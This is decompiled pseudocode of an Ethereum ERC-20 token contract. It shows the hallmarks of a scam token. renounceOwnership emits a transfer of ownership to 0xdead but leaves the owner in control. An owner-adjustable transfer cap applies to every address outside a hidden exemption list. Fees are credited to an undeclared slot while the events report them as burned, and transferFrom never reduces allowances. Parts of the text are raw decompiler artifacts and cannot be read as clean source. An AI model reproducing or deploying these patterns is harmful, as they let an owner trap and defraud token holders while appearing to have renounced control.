contract main {




// =====================  Runtime code  =====================


uint16 stor0;
address stor0; offset 16
address owner;
mapping of uint256 balanceOf;
mapping of uint256 allowance;
mapping of uint8 stor3;
array of uint256 name;
array of uint256 symbol;
uint256 decimals;
uint256 totalSupply;
uint256 stor8;
address sub_e40d4c8cAddress;
uint256 stor11;
address burnaddress;

function name() payable {
    return name[0 len name.length]
}

function totalSupply() payable {
    return totalSupply
}

function decimals() payable {
    return decimals
}

function balanceOf(address arg1) payable {
    require calldata.size - 4 >= 32
    return balanceOf[address(arg1)]
}

function owner() payable {
    return owner
}

function symbol() payable {
    return symbol[0 len symbol.length]
}

function allowance(address arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    return allowance[address(arg1)][address(arg2)]
}

function sub_e40d4c8c(?) payable {
    return sub_e40d4c8cAddress
}

function burnaddress() payable {
    return burnaddress
}

function _fallback() payable {
    revert
}

function sub_1b3b8e55(?) payable {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    stor8 = arg1
}

function sub_f3090833(?) payable {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    sub_e40d4c8cAddress = arg1
}

function renounceOwnership() payable {
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    emit OwnershipTransferred(owner, 57005);
    uint16(stor0.field_0) = 57005
    Mask(144, 0, stor0.field_16) = 0
}

function approve(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    37,
                    0x734945524332303a20617070726f76652066726f6d20746865207a65726f20616464726573,
                    mem[201 len 27]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    35,
                    0x734945524332303a20617070726f766520746f20746865207a65726f20616464726573,
                    mem[199 len 29]
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function transfer(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    38,
                    0xfe4945524332303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                    mem[202 len 26]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    36,
                    0x774945524332303a207472616e7366657220746f20746865207a65726f20616464726573,
                    mem[200 len 28]
    if stor3[address(msg.sender)]:
        if arg1 != msg.sender:
            if balanceOf[address(msg.sender)] < arg2:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            39,
                            0x734945524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                            mem[203 len 25]
            balanceOf[address(msg.sender)] -= arg2
        else:
            if stor3[address(msg.sender)]:
                if balanceOf[address(msg.sender)] >= arg2:
                    balanceOf[address(msg.sender)] -= arg2
            else:
                if balanceOf[address(msg.sender)] < arg2:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                32,
                                39,
                                0x734945524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                mem[203 len 25]
                balanceOf[address(msg.sender)] -= arg2
        balanceOf[address(arg1)] += arg2
        emit Transfer(arg2, msg.sender, arg1);
        emit Transfer(0, msg.sender, burnaddress);
    else:
        if stor3[address(arg1)]:
            if arg1 != msg.sender:
                if balanceOf[address(msg.sender)] < arg2:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                32,
                                39,
                                0x734945524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                mem[203 len 25]
                balanceOf[address(msg.sender)] -= arg2
            else:
                if stor3[address(msg.sender)]:
                    if balanceOf[address(msg.sender)] >= arg2:
                        balanceOf[address(msg.sender)] -= arg2
                else:
                    if balanceOf[address(msg.sender)] < arg2:
                        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                    32,
                                    39,
                                    0x734945524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                    mem[203 len 25]
                    balanceOf[address(msg.sender)] -= arg2
            balanceOf[address(arg1)] += arg2
            emit Transfer(arg2, msg.sender, arg1);
            emit Transfer(0, msg.sender, burnaddress);
        else:
            if arg1 == this.address:
                if arg1 != msg.sender:
                    if balanceOf[address(msg.sender)] < arg2:
                        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                    32,
                                    39,
                                    0x734945524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                    mem[203 len 25]
                    balanceOf[address(msg.sender)] -= arg2
                else:
                    if stor3[address(msg.sender)]:
                        if balanceOf[address(msg.sender)] >= arg2:
                            balanceOf[address(msg.sender)] -= arg2
                    else:
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                        32,
                                        39,
                                        0x734945524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                        mem[203 len 25]
                        balanceOf[address(msg.sender)] -= arg2
                balanceOf[address(arg1)] += arg2
                emit Transfer(arg2, msg.sender, arg1);
                emit Transfer(0, msg.sender, burnaddress);
            else:
                if not arg2:
                    require arg2 <= stor8
                    if arg1 != msg.sender:
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 0, 32, 39, 0x734945524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63, mem[267 len 25]
                        balanceOf[address(msg.sender)] -= arg2
                    else:
                        if stor3[address(msg.sender)]:
                            if balanceOf[address(msg.sender)] >= arg2:
                                balanceOf[address(msg.sender)] -= arg2
                        else:
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 0, 32, 39, 0x734945524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63, mem[267 len 25]
                            balanceOf[address(msg.sender)] -= arg2
                    balanceOf[address(arg1)] += arg2
                    emit Transfer(arg2, msg.sender, arg1);
                    emit Transfer(0, msg.sender, burnaddress);
                else:
                    require arg2
                    if arg2 * stor11 / arg2 != stor11:
                        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                    32,
                                    33,
                                    0x65536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                                    mem[197 len 31]
                    require arg2 <= stor8
                    if arg1 != msg.sender:
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 0, 32, 39, 0x734945524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63, mem[267 len 25]
                        balanceOf[stor12] += arg2 * stor11 / 100
                        balanceOf[address(msg.sender)] -= arg2
                    else:
                        if stor3[address(msg.sender)]:
                            balanceOf[stor12] += arg2 * stor11 / 100
                            if balanceOf[address(msg.sender)] >= arg2:
                                balanceOf[address(msg.sender)] -= arg2
                        else:
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 0, 32, 39, 0x734945524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63, mem[267 len 25]
                            balanceOf[stor12] += arg2 * stor11 / 100
                            balanceOf[address(msg.sender)] -= arg2
                    balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * stor11 / 100)
                    emit Transfer((arg2 - (arg2 * stor11 / 100)), msg.sender, arg1);
                    emit Transfer((arg2 * stor11 / 100), msg.sender, burnaddress);
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) payable {
    require calldata.size - 4 >= 96
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    38,
                    0xfe4945524332303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                    mem[202 len 26]
    if not arg2:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    36,
                    0x774945524332303a207472616e7366657220746f20746865207a65726f20616464726573,
                    mem[200 len 28]
    if stor3[address(arg1)]:
        if arg1 != arg2:
            if balanceOf[address(arg1)] < arg3:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            39,
                            0x734945524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                            mem[203 len 25]
            balanceOf[address(arg1)] -= arg3
        else:
            if stor3[address(msg.sender)]:
                if balanceOf[address(arg1)] >= arg3:
                    balanceOf[address(arg1)] -= arg3
            else:
                if balanceOf[address(arg1)] < arg3:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                32,
                                39,
                                0x734945524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                mem[203 len 25]
                balanceOf[address(arg1)] -= arg3
        balanceOf[address(arg2)] += arg3
        emit Transfer(arg3, arg1, arg2);
        emit Transfer(0, arg1, burnaddress);
        if allowance[address(arg1)][address(msg.sender)] < arg3:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        41,
                        0x654945524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e63,
                        mem[205 len 23]
    else:
        if stor3[address(arg2)]:
            if arg1 != arg2:
                if balanceOf[address(arg1)] < arg3:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                32,
                                39,
                                0x734945524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                mem[203 len 25]
                balanceOf[address(arg1)] -= arg3
            else:
                if stor3[address(msg.sender)]:
                    if balanceOf[address(arg1)] >= arg3:
                        balanceOf[address(arg1)] -= arg3
                else:
                    if balanceOf[address(arg1)] < arg3:
                        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                    32,
                                    39,
                                    0x734945524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                    mem[203 len 25]
                    balanceOf[address(arg1)] -= arg3
            balanceOf[address(arg2)] += arg3
            emit Transfer(arg3, arg1, arg2);
            emit Transfer(0, arg1, burnaddress);
            if allowance[address(arg1)][address(msg.sender)] < arg3:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            41,
                            0x654945524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e63,
                            mem[205 len 23]
        else:
            if arg2 == this.address:
                if arg1 != arg2:
                    if balanceOf[address(arg1)] < arg3:
                        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                    32,
                                    39,
                                    0x734945524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                    mem[203 len 25]
                    balanceOf[address(arg1)] -= arg3
                else:
                    if stor3[address(msg.sender)]:
                        if balanceOf[address(arg1)] >= arg3:
                            balanceOf[address(arg1)] -= arg3
                    else:
                        if balanceOf[address(arg1)] < arg3:
                            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                        32,
                                        39,
                                        0x734945524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                        mem[203 len 25]
                        balanceOf[address(arg1)] -= arg3
                balanceOf[address(arg2)] += arg3
                emit Transfer(arg3, arg1, arg2);
                emit Transfer(0, arg1, burnaddress);
                if allowance[address(arg1)][address(msg.sender)] < arg3:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                32,
                                41,
                                0x654945524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e63,
                                mem[205 len 23]
            else:
                if not arg3:
                    require arg3 <= stor8
                    if arg1 != arg2:
                        if balanceOf[address(arg1)] < arg3:
                            revert with 0, 32, 39, 0x734945524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63, mem[267 len 25]
                        balanceOf[address(arg1)] -= arg3
                    else:
                        if stor3[address(msg.sender)]:
                            if balanceOf[address(arg1)] >= arg3:
                                balanceOf[address(arg1)] -= arg3
                        else:
                            if balanceOf[address(arg1)] < arg3:
                                revert with 0, 32, 39, 0x734945524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63, mem[267 len 25]
                            balanceOf[address(arg1)] -= arg3
                    balanceOf[address(arg2)] += arg3
                    emit Transfer(arg3, arg1, arg2);
                    emit Transfer(0, arg1, burnaddress);
                else:
                    require arg3
                    if arg3 * stor11 / arg3 != stor11:
                        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                    32,
                                    33,
                                    0x65536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                                    mem[197 len 31]
                    require arg3 <= stor8
                    if arg1 != arg2:
                        if balanceOf[address(arg1)] < arg3:
                            revert with 0, 32, 39, 0x734945524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63, mem[267 len 25]
                        balanceOf[stor12] += arg3 * stor11 / 100
                        balanceOf[address(arg1)] -= arg3
                    else:
                        if stor3[address(msg.sender)]:
                            balanceOf[stor12] += arg3 * stor11 / 100
                            if balanceOf[address(arg1)] >= arg3:
                                balanceOf[address(arg1)] -= arg3
                        else:
                            if balanceOf[address(arg1)] < arg3:
                                revert with 0, 32, 39, 0x734945524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63, mem[267 len 25]
                            balanceOf[stor12] += arg3 * stor11 / 100
                            balanceOf[address(arg1)] -= arg3
                    balanceOf[address(arg2)] = balanceOf[address(arg2)] + arg3 - (arg3 * stor11 / 100)
                    emit Transfer((arg3 - (arg3 * stor11 / 100)), arg1, arg2);
                    emit Transfer((arg3 * stor11 / 100), arg1, burnaddress);
                if allowance[address(arg1)][address(msg.sender)] < arg3:
                    revert with 0, 32, 41, 0x654945524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e63, mem[269 len 23]
    ('ge', ('stor', ('map', ('mask_shl', 160, 0, 0, 'msg.sender'), ('map', ('mask_shl', 160, 0, 0, ('param', 'arg1')), ('name', 'allowance', 2)))), ('param', 'arg3'))
    return 1
}



}
